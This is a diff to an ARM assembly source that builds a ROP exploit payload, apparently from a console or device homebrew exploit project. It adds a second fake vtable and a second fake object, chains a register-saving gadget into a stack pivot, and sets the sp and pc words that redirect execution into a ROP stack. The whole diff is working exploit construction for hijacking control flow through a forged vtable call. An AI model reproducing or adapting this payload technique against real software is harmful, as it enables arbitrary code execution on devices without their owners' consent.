@@ -15,30 +15,42 @@ vtable:
 .word 0
 .word 0
 .word 0
-.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
-//.word ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR @ vtable funcptr +16. Initial vtable funcptr call for the main-thread. This saves {r4-r8, lr} on the stack, then calls the funcptr from vtable+0x28 below.
+.word ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0. This is the initial vtable funcptr call. This saves {r4-r8, lr} on the stack, then calls the funcptr from vtable+0x28 below.
 
-/*@ vtable+0x28, called by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR. This then does the usual stack-pivot.
-.space ((vtable + 0x28) - .)
-.word ROP_LOADR4_FROMOBJR0*/
+vtable2:
+.word 0
+.word 0
+.word 0
+.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
+
+@ vtable2+0x28, called by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR. This then does the usual stack-pivot.
+.space ((vtable2 + 0x28) - .)
+.word ROP_LOADR4_FROMOBJR0
 
 object:
 .word ROPBUFLOC(vtable) @ object+0, vtable ptr.
 .word 0
 .word 0
 .word 0
-.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10.
 
-.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
+@ objptr loaded by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR.
+.space ((object + 0x34) - .)
+.word ROPBUFLOC(object2)
+
+object2:
+.word ROPBUFLOC(vtable2) @ object+0, vtable ptr.
+.word 0
+.word 0
+.word 0
+.word ROPBUFLOC(object2 + 0x20) @ This .word is at object2+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+
+.space ((object2 + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
 
 stackpivot_sploadword:
 .word ROPBUFLOC(ropstackstart) @ sp
 stackpivot_pcloadword:
 .word ROP_POPPC @ pc
-
-/*@ objptr loaded by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR.
-.space ((object + 0x34) - .)
-.word ROPBUFLOC(object)*/
 
 ropstackstart:
 
